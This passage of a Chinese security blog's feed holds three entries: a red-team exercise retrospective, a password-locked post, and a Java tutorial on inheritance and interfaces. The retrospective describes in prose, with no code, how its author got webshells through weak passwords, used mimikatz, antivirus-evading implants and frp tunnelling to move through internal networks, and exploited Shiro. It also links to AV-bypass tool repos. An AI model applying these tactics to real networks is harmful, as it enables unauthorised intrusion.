    <content type="html"><![CDATA[<h1 id="说在前面"><a href="#说在前面" class="headerlink" title="说在前面"></a>说在前面</h1><blockquote><p>首先，菜鸡道歉，DBQ另一位大师傅！我太菜了，没能拿到第一。最终拿了第三，二等奖，本地厂商第一。</p></blockquote><p>这次公鸡队比较少，7支队伍，4支本地厂商，3支大厂。大厂是<strong>奇安信、天融信、安恒。</strong></p><p>该市参演单位覆盖了媒体、学校、医院、能源、交通、银行(金融)、政府系统。但是互联网区的资产相对较少，甚至有的目标直接给的是内网靶标。</p><p>这是此次攻防的背景介绍吧。</p><h1 id="红队视角下的攻防演练"><a href="#红队视角下的攻防演练" class="headerlink" title="红队视角下的攻防演练"></a>红队视角下的攻防演练</h1><p>攻防演练之前参加过，国家级、省级都参加过，只不过是蓝队，做防守的。</p><p>蓝队的话，前期的攻击面分析、资产表整理比较麻烦。还有正式行动前的模拟对抗也是蓝队做的。等正式开始后，主要是就是安全设备的监控、策略分发、应急响应、公鸡者溯源。</p><p>红队的话，这次算第一次实地作战，之前远程支援过某直辖市的演练，体验不是很明显。</p><p>我认为，攻防中红队的目的非常明确：</p><ul><li>权限</li><li>权限</li><li>权限</li></ul><p>对，没有错，就是shell、权限（Web应用管理员、超级管理员、系统管理员权限、主机权限、数据库权限、路由器、防火墙等设备权限）。</p><p>之前，也说</p><ul><li>数据</li><li>数据</li><li>数据</li></ul><p>对，也没有错，但是要获取大量数据，主要是大量，至少也得几万几十万那种吧。不打到内网核心区，肯定是拿不到的。除非DMZ区的数据库 就很大，并且都是一些重要的数据。</p><p>并且，获取WebShell，才是开始。也就是入口权限。</p><ul><li>某系统弱口令后台修改模板GetShell-&gt;内网漫游</li><li>某系统目标同IP其他端口是Tomcat、弱口令+部署WAR包GetShell，双网卡，192段和172段、192段出网-&gt;内网漫游</li></ul><p>因为是红队，不同于常规的安服、渗透。是肯定要打内网的。所以这时候能拿下一台边界主机，存在双网卡机器的或者存在内网ip的机器权限，就可以上冰蝎，冰蝎主要是动态二进制加密，可以绕过一些安全设备的检测，当然也可以用哥斯拉。做权限维持，这里一定要拿到入口权限后做权限维持，因为一开始我们拿到一个webshell之后，被另一个公鸡队给删了。</p><p>权限维持做好后，要么弹shell到MSF上，进行横向移动，mimikataz抓密码，或者哈希。或者直接弄一个上线CS的简单免杀马，这次另一个大师傅就是在他们团队负责搞免杀的。Orz。上线CS后，也方便协同作战，并且高度自定义的CS，有很多自动化插件，一键信息搜集，当然前提是目标机器安全性很低，没有装太多杀软，要么就绕。</p><p>横向会遇到隔离问题</p><ul><li>逻辑隔离</li><li>物理隔离</li><li>强制物理隔离（有待研究是否和物理隔离有区别，记不清了）</li></ul><p>这也是第一次听这个术语，大概意思就是网络不互通，要通过跳板机流量一台一台跳。之后听奇安信的一个师傅说，有一台机器他跳了很多台，最后查看一个文件都要花一分钟。np。</p><p>说道这里，就不得不说内网穿透的问题。</p><ul><li>frp</li><li>nps</li></ul><p>流量进的去，数据出的来。</p><p>我这次在某目标翻文件的时候，删了不知道是哪个公鸡队的frp哈哈。</p><p>有的机器，拿下权限之后，不能直接托文件。只能自己下载（远程加载）：</p><ul><li>powershell</li><li>net use</li><li>……</li></ul><p>最后就说下分工吧，打红队分工真的是很重要的，如果是混战模式，即所有公鸡队的目标都是一样的，那就是比谁先发现漏洞了，谁发现的早，谁报告交的早，分就能拿到，发现的晚了，要么目标被打出局，要么洞就被修了。</p><blockquote><p>这次就是因为我们觉得某系统不好打，晚点看，等去看发现是shiro的时候，已经打不了shiro550了。因为奇安信的人打了，并且通过这个打进去了，拿了1W+分。后面目标那边把shiro升级了，我们就没办法了，在这里失分了。所以 说，还是信息搜集不到位。</p></blockquote><p>这里提到了信息搜集，就说下攻防时信息搜集的问题：</p><ul><li>很多目标没有域名</li><li>域名基本没有或者很少子域名</li><li>没有SSL证书</li><li>备案号查询甚至差不多历史域名</li><li>企查查基本没啥用</li><li>fofa都没收录这些站点</li><li>某些站点纯静态</li><li>目标系统上云</li><li>目标只是当地系统，但是托管是全国范围的</li><li>目标系统IP为供应商IP，统一管理</li></ul><p>一些方法来扩大资产：</p><ul><li>C段扫描，Goby推荐，扫的快，还能探测一些洞，估计缺点就是可能会遗漏，我还没研究为什么goby能扫的这么快。</li><li>单一IP全端口扫描</li><li>旁站（拿下旁站WebShell可以试着跳目录过去，去读、下载源码啥的，但是一般不可行</li><li>IP查历史域名</li><li>目录扫描推荐白名单目录，不要去探测一些信息泄露的目录，容易被WAF阻断</li><li>指纹识别，不要过度依赖插件或者简单凭借经验。一定要去抓包看看，看清楚了</li></ul><p>一些突破点：</p><ul><li>还是攻防神器，fastjson、shiro、Weblogic（这次没有能打的），Spring。的，一定要重点去试试，不能放过任何一个</li><li>弱口令永远的神</li><li>历史漏洞</li><li>当然有0day，我也没话说</li></ul><h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><p>心得体会就说这么多咯。暴露的我问题我内心也清楚了，要想成为RedTeam还有很长的路要走~</p><p><strong>一定要多实战！</strong></p><hr><p>推荐一些资料：github yyds</p><p><a href="https://github.com/fengjixuchui/RedTeamer">https://github.com/fengjixuchui/RedTeamer</a></p><p><a href="https://github.com/bluscreenofjeff/Red-Team-Infrastructure-Wiki">https://github.com/bluscreenofjeff/Red-Team-Infrastructure-Wiki</a></p><p><a href="https://github.com/yeyintminthuhtut/Awesome-Red-Teaming">https://github.com/yeyintminthuhtut/Awesome-Red-Teaming</a></p><p><a href="https://github.com/foobarto/redteam-notebook">https://github.com/foobarto/redteam-notebook</a></p><p><a href="https://github.com/k8gege/K8tools">https://github.com/k8gege/K8tools</a></p><p><a href="https://github.com/Lucifer1993/SatanSword">https://github.com/Lucifer1993/SatanSword</a></p><p><a href="https://github.com/enaqx/awesome-pentest">https://github.com/enaqx/awesome-pentest</a></p><p><a href="https://github.com/TideSec/BypassAntiVirus">https://github.com/TideSec/BypassAntiVirus</a></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;说在前面&quot;&gt;&lt;a href=&quot;#说在前面&quot; class=&quot;headerlink&quot; title=&quot;说在前面&quot;&gt;&lt;/a&gt;说在前面&lt;/h1&gt;&lt;blockquote&gt;
&lt;p&gt;首先，菜鸡道歉，DBQ另一位大师傅！我太菜了，没能拿到第一。最终拿了第三，二等奖，本地厂商第一。&lt;</summary>
      
    
    
    
    
    <category term="红蓝对抗" scheme="https://hack-for.fun/tags/%E7%BA%A2%E8%93%9D%E5%AF%B9%E6%8A%97/"/>
    
  </entry>
  
  <entry>
    <title>针对几个典型问题的回答</title>
    <link href="https://hack-for.fun/995.html"/>
    <id>https://hack-for.fun/995.html</id>
    <published>2020-11-09T10:50:32.000Z</published>
    <updated>2020-12-03T03:32:01.169Z</updated>
    
    <content type="html"><![CDATA[<div id="hexo-blog-encrypt" data-wpm="抱歉, 这个密码看着不太对, 请再试试." data-whm="抱歉, 这个文章不能被校验, 不过您还是能看看解密后的内容."><div class="hbe-input-container"><input type="password" id="hbePass" placeholder="您好, 这里需要密码." /><label>您好, 这里需要密码.</label><div class="bottom-line"></div></div><script id="hbeData" type="hbeData" data-hmacdigest="1f7c801b1dccc4337426f0c2f22dfcc69bff4a3af8960b7eb2d3937e44bbe56a">ffec7d04fd4c92f5bf0cf7d4742b747128cd71842845ca462b867e7a80a8181ad32d935726e14e03f5923455db6354097d9f51e534685a0d1c0427e177233ea78ef44d1187590dfb515f60369c2f4c318ace3cdb5296b216ea772f73dc4ebf33655541ad6232527c31e94b055d40003f5aa55b94d16b6a1689ad5370eeaf8ec0b702486231dad15e16ae4f83147f2b581d587af89505cca1635f5fa395982a4a949c8a4bb6347a483135ab9d1b61498dc149bce9a91fcf4860aa2c1139086e2ca56ad4d60570fa96c3a7bda711eec7b2262ab166fef09887fcded875b076675ce57572b4fd519cbf3cede7a75e230774eece2add110233523dd3f1f25713a3abb0cbc51eb1c2b5b11f6d07c101ac3d8ebdefc7fd9a1d8642fc485c219389b6ba99d5f892910109d064429407215adbc2cc7bd5d7107ced1e0df99e279a3bb2dd2c4c3e81f3cfaa6c75a05df433808c864058acd7f8456eafa6b8504f3a5cbbf2dcf15b06409cace8da071fa3f9e097bc84e097a7d18a1c0e0a47a38d9c565759feb9ba5e58f07b50e2107b01de0334372f1d19d43ddf1205fff2c4a7074f36bb8fc381d91c03cbb3653b5b06ed55d704afd2b4710ff405ec9e5a4b776f39f23d374b7605607eb0214a47d9c295cf0d9105305ca3d510c3ed819269ed4323b3145acb4887ffc0d09e880917629716e637c3d7bbd4a59dac4724bc129abee48e328e2449cec9a0464f23294a23f3d301531dd2a36e12f5b33b1128efae022e35ab9b8dab6f1d19627f90320db230dff01aa0c81352b3246819885b9f69b1af18f562de10e37149079b65597850af5ebd69520ce2a953d5d92fb18884ff76138deb4c65183c66dd61c3db1844773068f19b74321c73f22dbc6abaab10e1e22b4f97431595c1ca8c574ebce1f8e08130d64faf3c625f6c89cc0c699dfb9fb0e363407a46f183636de48cc7c62118eb9e087f9a6137a53226ea48bf0ffd3b96776dc9a11ce77f1501f68279cb0b2d724a816556094e60c46d7b040051c6a75d9a73f7d4943d641572e241250e6d72278606f54fc821aca3387de5c1fc26fa1357a9e0ef63821cbcb11aefb7d2209aa6c1e63c9b991a3dded66ea6067f07f00c95b6d48478a2b60e90a08e647d0792d300fafa0c8a2310df4145f4872c5bf44d87d81cc914de7b1b6476e03e09c761b266d3bdfd7db953a0f93ab4d994541d83fb4abc79b922da52b736c9055ed18a3e6f961153af28de4a22b9267dd92fc0854f55efc754095f10c6641ac19802e9c9e8d11f692c4b677c23900dac6d59ccdf953283e14a1be8e0743586accf7f8599f490d242bf596bfdccef4aae2b0a62d228d228c81f8872ae66028d4bc1baa722b3d30ca19c2cc45895cfb67b74894e32158a8059fff075636e986d5dbb035cce009d2a0ea7c19e46d9a853c78b7cd6a27d09739a0c5e0b971e40b7004fd7a75bf6d194c8678a28b13756758da224d63c9fbd1221a4465abe940c5752faa599fbdbc77d4afc6e583f95f7d98486faaafa7946ba4c24d98be1ee2e582aa551745937b027ddf36bca5361d2760b3737f6ebbb98177a43d8b408e7950caded5c57554246aaf41bf52665bf90553c18a473258f9f7229d7f1933006ee6af4afb76c99af939e05c910b4076ea29dc9bdf2477828bec35f21f2c0865677823621ec6ef694bdb34d4c2fc7c09262aa57b30e68bdf2951ad321336be101bdab4871398655b9ef1f8b702b78430f8dbc7fd09de08c1d73ad8339f1919f876e60c55885d6dd0a910c6f0e49de4d52ce3aa1c89eabbf4e0b64cdd6b8c1063cdefc0c9cc123e58585e1d55f530e19deff04c93f79e47ba89fb3a65d070755a7987545165dba0bb0a092b70e7cd6e09cf1c03a981a2e578d78ffaac55a6a704e4fc62fb03b774686555da7869ff87b52210ab084ef5f1288f53ca556b2492a1985349da66bfefc363b2c9443ab1ac3d771708f7ee535f98afd4943089e9a39a6813c0f7ba8a538e7334f38e7823809948f2dea8b285c383a0906aa3e32d51b2d0d6252c00ef458d1ee03206e0457a45f088f0a58723b8465861ded9ae26e74f5e119882bac4177fb89828e549b1ce6a45c361844a4632810fca8dbee7e4c5c61604bbd8e37511d8a174e6c00da53471aa5cc5402f917b5cf5ff8fa9b4c4fef98f1054783f3eba6f1191248d1e62b3295cd89976de02e8a28a9718bed1b51dd7c9499609f2c5c72fa5215f6850d89579740c193b9da2624dd64ba12e934c8c9a1e8fb07618788b287ed374ab2d6e510d93f991e3a75926364d22af786c49e4958bf349e2641a74e08a60fa8719ebcb9f89ba7a42ed53f8ece370947105963897e3cdea99f662996de208a2f89769112821e156ff423962daee0f3cc54150639fa75927c7ba038a095a4482a40598caa7e04a8660421243c4665d2ebfc406f9b5175b8fd19506b8ccd391d168d879d3cf8bf20dd8f214419b8d61718092c1b2cf960248effe31407aaee5339ab71f04e7d83e31e9f6cd5b26d4cbc439d62254a8e2cf6fe18bb5ba26cc78cff4b22c29905874f84663f257aa2d1466ed9debbefa83271dbd4782850e5cac29885c99a686606ab1950e087dba0e74ecf8e876486b690174ffaa3bece37002189a3fce8bc8c9d8e0aedc841c807b38bc99a53f7b451b65411b45ac3e0e0544a682d84fd0e020bc8dd11d358c178cea5d7cd767a7e44b7eb89d65b20680271470a41ef9a745fe5486dd468449049826508b3f525cb389448d6b354df34d6c3f86bca8b5aec043bfebfba081c72990e7fe7bd2a4d55737393cbb840e33a7e65ac9ee8330a6eb8096f22860b0878ab92eaf26dfc7bec296113d15d2c7cc4f607499f081a09f5f307ec9480bff782007846880474974912d946dc1df4a529ca57f1e0d87b6cb087ccdd41ae86613b00addfde7e6efc2ee311939fc6b24103b6c307e5cbfa0e59f9862c878a901824cc43a7af41df7716e998c09d9e75612883de0d6487562a08d10c94653f4579f440499fa104bbf1f7f96cd293035020200d7f42f88206229bf5d1a890209fa5bc2c2fa02d158da8e171cce3e2d29678eaf7a9c96d96218c8b0d85a1a89bf7d8dc0549a17f1135eec6bc9baa4d7f650e68042e46ff1865841fa33866cc110745b211d7895539e3036473c7be6e5c4c34f9a87b4d3c63e85992df6d3836d2a242f18160b42276c1364bee15e56a952b73b71107ba3c1d4bfff1f5ae2c25b5f1363335ba81d391bec862291681cf4f4414c978efc3ba0388d9416b2f4f6720341f96a067cc12a34945359e25a4dc2e649ff12d184b3b10206266adbd58c3bf580d47ac975b57c9e16e08ecb8b019b018adbf8f0023c9473889b9b2632b7585f87d5413a0b4b2bdbcf2d353577f8a6b0295b51d3352b90e38f544a1a4c7cee77275d995df713858ebf5eaf900230e9dfb414fbdabd7b33a261ab8ebfda3a303c274951a940f48accf7e3d26ab1a184498a26d77a156363da58853618c32b15020991211ffb5c660a50873a3ee9e68538a1e630776556c31da887e769556960395c7cc2baccef6d02e05348f50bde6f91b0b39dc5303888171ac73bdae2ac906baf16a1adf0876a476d5bdde4cec5a90e8fb35e29d287d2c17d448c35d7b66a8c6586f4f0edc82407a4eda6b5cc5cff0ecaf09f64b89eaca86345fa8dc4170d8a783df1a07429679aec998535ec116867f5cdcb19b22ec089985a4f60f9bef061b751fedcc623d23730053689b9596b70d2c76a8c840bbfa269304d5cdb0e94b674da88742132d4d804acaa5dead5f6220ebf5a9cf026dc48a935ace083d8e20d23e79cbb5dc42ad4dbb9b46c235f7cceb8e704f0f0ad36732be43c7eb1b6e017df063d121e5b352313560a4ba9f2579117c155e70b330fd0ad4f3ef19496adf58d955a93f64b483b6457585b7ad8f07439e38b233963330c07539c62eb2c8e6b23da39eeae7361933152d2eabef38bbf57f8f34a76102e3669ee31a25bb470e9405af0115454779ac722333c58928bafe628a9924fc251bc210877b6c78653b6fcd09758a9f7e052ec81d41284c5283e5865673d6d25abaece32eb5f6fc48b3a97013c4a6ce23388b88e55f2975cc7a3f2a6a9770c44d15c2480a0b06ab9c30faa0e20fde9b956cbbc49089f3c81b39f16b5d396da564bb3c51cca688bc95ae0f7482cace05088e36c5d373978bc2b3adb33b2c5dc19115a05b5e311b8bd3e6f9f03d542e490e14ac314e8f96473e792cd4fd18ea3fcfab1744223bfa848b381f1e44c58689e093459ce3fc00c1e5314205be076b1aac2ecd85e67305fec15026ece7e6946417e5c877187d8f85b1f0f8afc85fdb7ca6279def275c7293641cd12847229edb0e03cb94512dc458b7c1ea4295a49d0afbdf9adcfad465c96edcb5e498f6d425a760fd10392f2d5aea1da7396bd02aa99c3c5eaed28218fd8c24ab8774ac8f65c1737714b2c8410239df5a28182f232fa150d3d64a8e1de1f1de7c0cf6cf61e63fdf95d5f904205cf1af30ceb3afc3bab650d2acd107b3423fb8f241b08a80f309d7e26fd0b95598844093d13c9abbaa</script></div><script src="/lib/blog-encrypt.js"></script><link href="/css/blog-encrypt.css" rel="stylesheet" type="text/css">]]></content>
    
    
    <summary type="html">有东西被加密了, 请输入密码查看.</summary>
    
    
    
    
    <category term="渗透测试" scheme="https://hack-for.fun/tags/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"/>
    
  </entry>
  
  <entry>
    <title>Coding-Java-继承与多态以及抽象类与接口</title>
    <link href="https://hack-for.fun/d300.html"/>
    <id>https://hack-for.fun/d300.html</id>
    <published>2020-11-08T09:14:55.000Z</published>
    <updated>2020-11-08T17:15:05.177Z</updated>
    
    <content type="html"><![CDATA[<p>[toc]</p><h1 id="学习资料"><a href="#学习资料" class="headerlink" title="学习资料"></a>学习资料</h1><p><a href="https://www.bilibili.com/video/BV1754y1X7n9?from=search&amp;seid=6059305124304871168">https://www.bilibili.com/video/BV1754y1X7n9?from=search&amp;seid=6059305124304871168</a></p><p><a href="https://www.liaoxuefeng.com/wiki/1252599548343744/1260454185794944">https://www.liaoxuefeng.com/wiki/1252599548343744/1260454185794944</a></p><h1 id="方法"><a href="#方法" class="headerlink" title="方法"></a>方法</h1><h3 id="构造方法"><a href="#构造方法" class="headerlink" title="构造方法"></a>构造方法</h3><p>由于构造方法是如此特殊，所以构造方法的名称就是类名。构造方法的参数没有限制，在方法内部，也可以编写任意语句。但是，和普通方法相比，构造方法没有返回值（也没有<code>void</code>），调用构造方法，必须用<code>new</code>操作符。</p><p>没有在构造方法中初始化字段时，引用类型的字段默认是<code>null</code>，数值类型的字段用默认值，<code>int</code>类型默认值是<code>0</code>，布尔类型默认值是<code>false</code>：</p><h3 id="方法重载"><a href="#方法重载" class="headerlink" title="方法重载"></a>方法重载</h3><p>在一个类中，我们可以定义多个方法。如果有一系列方法，它们的功能都是类似的，只有参数有所不同，那么，可以把这一组方法名做成<em>同名</em>方法。例如，在<code>Hello</code>类中，定义多个<code>hello()</code>方法：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Hello</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">hello</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;Hello, world!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">hello</span><span class="params">(String name)</span> </span>&#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;Hello, &quot;</span> + name + <span class="string">&quot;!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">hello</span><span class="params">(String name, <span class="keyword">int</span> age)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (age &lt; <span class="number">18</span>) &#123;</span><br><span class="line">            System.out.println(<span class="string">&quot;Hi, &quot;</span> + name + <span class="string">&quot;!&quot;</span>);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            System.out.println(<span class="string">&quot;Hello, &quot;</span> + name + <span class="string">&quot;!&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这种方法名相同，但各自的参数不同，称为方法重载（<code>Overload</code>）。</p><h1 id="继承"><a href="#继承" class="headerlink" title="继承"></a>继承</h1><p>继承是面向对象编程中非常强大的一种机制，它首先可以复用代码。当我们让<code>Student</code>从<code>Person</code>继承时，<code>Student</code>就获得了<code>Person</code>的所有功能，我们只需要为<code>Student</code>编写新增的功能。</p><p>Java使用<code>extends</code>关键字来实现继承：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Person</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> String name;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">int</span> age;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">getName</span><span class="params">()</span> </span>&#123;...&#125;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">setName</span><span class="params">(String name)</span> </span>&#123;...&#125;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">getAge</span><span class="params">()</span> </span>&#123;...&#125;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">setAge</span><span class="params">(<span class="keyword">int</span> age)</span> </span>&#123;...&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Student</span> <span class="keyword">extends</span> <span class="title">Person</span> </span>&#123;</span><br><span class="line">    <span class="comment">// 不要重复name和age字段/方法,</span></span><br><span class="line">    <span class="comment">// 只需要定义新增score字段/方法:</span></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">int</span> score;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">getScore</span><span class="params">()</span> </span>&#123; … &#125;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">setScore</span><span class="params">(<span class="keyword">int</span> score)</span> </span>&#123; … &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>继承有个特点，就是子类无法访问父类的<code>private</code>字段或者<code>private</code>方法</p><p>任何<code>class</code>的构造方法，第一行语句必须是调用父类的构造方法。如果没有明确地调用父类的构造方法，编译器会帮我们自动加一句<code>super();</code></p><blockquote><p>如果父类没有默认的构造方法，子类就必须显式调用<code>super()</code>并给出参数以便让编译器定位到父类的一个合适的构造方法。这里还顺带引出了另一个问题：即子类<em>不会继承</em>任何父类的构造方法。子类默认的构造方法是编译器自动生成的，不是继承的。</p></blockquote><h1 id="多态"><a href="#多态" class="headerlink" title="多态"></a>多态</h1><blockquote><p>Java的实例方法调用是基于运行时的实际类型的动态调用，而非变量的声明类型。</p></blockquote><p>这个非常重要的特性在面向对象编程中称之为多态。它的英文拼写非常复杂：Polymorphic。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Main</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">        <span class="comment">// 给一个有普通收入、工资收入和享受国务院特殊津贴的小伙伴算税:</span></span><br><span class="line">        Income[] incomes = <span class="keyword">new</span> Income[] &#123;</span><br><span class="line">            <span class="keyword">new</span> Income(<span class="number">3000</span>),</span><br><span class="line">            <span class="keyword">new</span> Salary(<span class="number">7500</span>),</span><br><span class="line">            <span class="keyword">new</span> StateCouncilSpecialAllowance(<span class="number">15000</span>)</span><br><span class="line">        &#125;;</span><br><span class="line">        System.out.println(totalTax(incomes));</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">double</span> <span class="title">totalTax</span><span class="params">(Income... incomes)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">double</span> total = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">for</span> (Income income: incomes) &#123;</span><br><span class="line">            total = total + income.getTax();</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> total;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Income</span> </span>&#123;</span><br><span class="line">    <span class="keyword">protected</span> <span class="keyword">double</span> income;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">Income</span><span class="params">(<span class="keyword">double</span> income)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.income = income;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">double</span> <span class="title">getTax</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> income * <span class="number">0.1</span>; <span class="comment">// 税率10%</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Salary</span> <span class="keyword">extends</span> <span class="title">Income</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">Salary</span><span class="params">(<span class="keyword">double</span> income)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">super</span>(income);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">double</span> <span class="title">getTax</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (income &lt;= <span class="number">5000</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> (income - <span class="number">5000</span>) * <span class="number">0.2</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">StateCouncilSpecialAllowance</span> <span class="keyword">extends</span> <span class="title">Income</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">StateCouncilSpecialAllowance</span><span class="params">(<span class="keyword">double</span> income)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">super</span>(income);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">double</span> <span class="title">getTax</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>🐂🍺</p><ul><li>子类可以覆写父类的方法（Override），覆写在子类中改变了父类方法的行为；</li><li>Java的方法调用总是作用于运行期对象的实际类型，这种行为称为多态；</li><li><code>final</code>修饰符有多种作用：<ul><li><code>final</code>修饰的方法可以阻止被覆写；</li><li><code>final</code>修饰的class可以阻止被继承；</li><li><code>final</code>修饰的field必须在创建对象时初始化，随后不可修改。</li></ul></li></ul><h1 id="抽象类"><a href="#抽象类" class="headerlink" title="抽象类"></a>抽象类</h1><p>如果父类的方法本身不需要实现任何功能，仅仅是为了定义方法签名，目的是让子类去覆写它，那么，可以把父类的方法声明为抽象方法：</p><p>面向抽象编程的本质就是：</p><ul><li>上层代码只定义规范（例如：<code>abstract class Person</code>）；</li><li>不需要子类就可以实现业务逻辑（正常编译）；</li><li>具体的业务逻辑由不同的子类实现，调用者并不关心。</li></ul><ul><li>通过<code>abstract</code>定义的方法是抽象方法，它只有定义，没有实现。抽象方法定义了子类必须实现的接口规范；</li><li>定义了抽象方法的class必须被定义为抽象类，从抽象类继承的子类必须实现抽象方法；</li><li>如果不实现抽象方法，则该子类仍是一个抽象类；</li><li>面向抽象编程使得调用者只关心抽象方法的定义，不关心子类的具体实现。</li></ul><h1 id="接口"><a href="#接口" class="headerlink" title="接口"></a>接口</h1><p>Java的接口特指<code>interface</code>的定义，表示一个接口类型和一组方法签名，而编程接口泛指接口规范，如方法签名，数据格式，网络协议等。</p><p>抽象类和接口的对比如下：</p><table><thead><tr><th align="left"></th><th align="left">abstract class</th><th align="left">interface</th></tr></thead><tbody><tr><td align="left">继承</td><td align="left">只能extends一个class</td><td align="left">可以implements多个interface</td></tr><tr><td align="left">字段</td><td align="left">可以定义实例字段</td><td align="left">不能定义实例字段</td></tr><tr><td align="left">抽象方法</td><td align="left">可以定义抽象方法</td><td align="left">可以定义抽象方法</td></tr><tr><td align="left">非抽象方法</td><td align="left">可以定义非抽象方法</td><td align="left">可以定义default方法</td></tr></tbody></table><h2 id="接口继承"><a href="#接口继承" 